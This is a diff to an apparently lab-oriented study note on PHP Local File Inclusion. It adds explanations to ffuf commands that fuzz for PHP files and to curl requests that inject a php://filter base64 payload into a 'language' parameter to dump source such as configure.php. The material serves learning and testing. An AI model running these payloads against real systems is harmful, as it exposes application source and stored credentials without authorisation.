@@ -4,9 +4,9 @@
 
 ## Why PHP Filters Matter for LFI
 
-When you `include()` a `.php` file, PHP **executes** it — you get the rendered HTML, not the source. That's useless for source-code disclosure. The `php://filter/` wrapper transforms the file's content before inclusion, so we can pipe the file through `convert.base64-encode` to get the raw source code base64-encoded in the response.
+When you `include()` a `.php` file, PHP **executes** it. You get the rendered HTML output, not the source code. That is useless for source-code disclosure. The `php://filter/` wrapper transforms the file's content before inclusion. Piping the file through `convert.base64-encode` returns the raw source code as a base64-encoded string in the response.
 
-This is **the** technique for extracting PHP source code via LFI.
+This is **the** technique for extracting PHP source code via Local File Inclusion (LFI).
 
 ---
 
@@ -47,7 +47,7 @@ Server interprets this as: open `config.php` (extension appended) → pipe throu
 ## Workflow: Source Disclosure
 
 ### 1. Fuzz for PHP files
-Scan **all** response codes, not just 200 — even 302/403 pages have readable source:
+Scan **all** response codes, not just 200. Even 302 and 403 pages have readable source via the filter wrapper.
 
 ```bash
 ffuf -w ~/SecLists/Discovery/Web-Content/common.txt:FUZZ \
@@ -58,6 +58,7 @@ ffuf -w ~/SecLists/Discovery/Web-Content/common.txt:FUZZ \
 ffuf -w ~/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ \
      -u "http://TARGET/FUZZ.php" -mc 200,301,302,403
 ```
+> Brute-forces PHP file names using `common.txt`. The `-mc` flag includes 301, 302, and 403 responses alongside 200s — many protected files still have readable source. Results are saved to a CSV for review.
 
 Pages of interest: `config`, `configure`, `db`, `database`, `settings`, `connect`, `login`, `auth`, `admin`, `dashboard`, `api`, `info`, `phpinfo`.
 
@@ -68,6 +69,7 @@ curl -sk "http://TARGET/index.php?language=php://filter/read=convert.base64-enco
   | head -1 \
   | base64 -d
 ```
+> The filter wrapper encodes the PHP file as base64 before returning it. The `grep -oP` pattern matches the base64 output starting with `PD9w` (which is `<?ph` in base64). Then `base64 -d` decodes it to reveal the raw PHP source.
 
 > The `PD9w` regex matches the base64 prefix of `<?php` so you grab only the encoded blob (not surrounding HTML).
 
@@ -105,6 +107,7 @@ ffuf -w ~/SecLists/Discovery/Web-Content/common.txt:FUZZ \
      -u "http://154.57.164.75:30699/FUZZ.php" -mc 200,301,302,403 -t 50 \
      -of csv -o /tmp/ffuf.csv
 ```
+> Discovers PHP files on the target. Replace the IP and port with the current lab target. The results include 302 redirects because some files are guarded by anti-direct-access checks.
 
 Discovered: `index.php`, `en.php`, `es.php`, **`configure.php`** (302 redirect).
 
@@ -114,6 +117,7 @@ Discovered: `index.php`, `en.php`, `es.php`, **`configure.php`** (302 redirect).
 curl -sk "http://154.57.164.75:30699/index.php?language=php://filter/read=convert.base64-encode/resource=configure" \
   | grep -oP 'PD9w[A-Za-z0-9+/=]+' | head -1 | base64 -d
 ```
+> Uses the base64 filter to extract the raw PHP source of `configure.php`. The app appends `.php` automatically, so specify just `configure` as the resource name.
 
 Result:
 ```php
